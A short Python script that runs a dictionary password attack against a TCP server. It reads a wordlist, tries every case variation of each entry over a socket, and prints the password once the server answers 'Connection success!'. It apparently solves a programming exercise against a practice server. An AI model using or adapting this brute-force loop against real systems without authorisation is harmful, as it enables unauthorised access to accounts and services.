from argparse import ArgumentParser
from itertools import product
from socket import socket
from typing import Final, Iterator


FILENAME: Final[str] = "./password_dictionary.txt"


def main() -> None:
    """Connect to a TCP Server and attempt to crack its password using a dictionary attack."""


    parser: ArgumentParser = ArgumentParser(description="Connect to a TCP Server, attempt to crack the password using a dictionary attack.")


    # Add command line arguments
    parser.add_argument("ip_address")
    parser.add_argument("port", type=int)

    args = parser.parse_args()
    ip_address: str = args.ip_address
    port: int = args.port

    # Establish a socket connection
    with socket() as client_socket:
        address: tuple[str, int] = (ip_address, port)


        client_socket.connect(address)

        for line in read_dictionary(FILENAME):
            for variation in generate_case_variations(line):
                client_socket.sendall(variation.encode())

                if client_socket.recv(1024).decode() == "Connection success!":
                    print(variation)
                    return


def generate_case_variations(line: str) -> Iterator[str]:
    """
    Lazily generate all case variations of a string.

    Args:
        line: A string to generate case variations for.

    Yields:
        str: The next possible case variation.
    """

    if not isinstance(line, str):
        raise TypeError("Input for case generation must be a string.")

    choices: list[tuple[str, ...]] = []

    for char in line:

        if char.isalpha():
            variations = (char.lower(), char.upper())
        else:
            variations = (char,)

        choices.append(variations)

    yield from ("".join(chars) for chars in product(*choices))


def read_dictionary(filename: str) -> Iterator[str]:
    """Read a password dictionary and yield valid entries one at a time."""
    with open(filename, "r", encoding="utf-8") as f:
        for line in f:
            if line.strip().isalnum():
                yield line.strip()





if __name__ == "__main__":
    main()